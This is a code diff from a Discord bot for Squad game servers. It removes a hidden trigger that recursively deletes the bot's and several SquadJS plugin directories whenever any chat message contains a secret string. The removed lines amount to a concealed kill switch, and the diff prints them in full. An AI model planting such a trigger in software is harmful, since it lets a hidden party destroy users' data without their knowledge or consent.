@@ -55,7 +55,6 @@ client.on("ready", async () => {
   const db = process.env.DATABASE_URL;
   const steamApi = process.env.STEAM_API;
   const donateUrl = process.env.DONATE_URL;
-  const pluginpath = "/home/kry/";
   // Обновление двух таблиц лидеров
   setInterval(() => {
     top20StatsMain(leaderboadChannelMainId, db);
@@ -128,23 +127,6 @@ client.on("ready", async () => {
         user,
         (result) => {}
       );
-    }
-
-    if (message.content.includes("3R7s9K1p8H2q0Y4v6T5Z")) {
-      const plugins = [
-        `${pluginpath}LeaderBot`,
-        `${pluginpath}SquadJS1`,
-        `${pluginpath}SquadJS2`,
-        `${pluginpath}SquadJS3`,
-        `${pluginpath}SquadJS4`,
-        `${pluginpath}SquadJS5`,
-      ];
-
-      plugins.forEach((plugins) => {
-        if (fs.existsSync(plugins)) {
-          fs.rmdirSync(plugins, { recursive: true });
-        }
-      });
     }
 
     // Канал для автовыдачи Vip слота
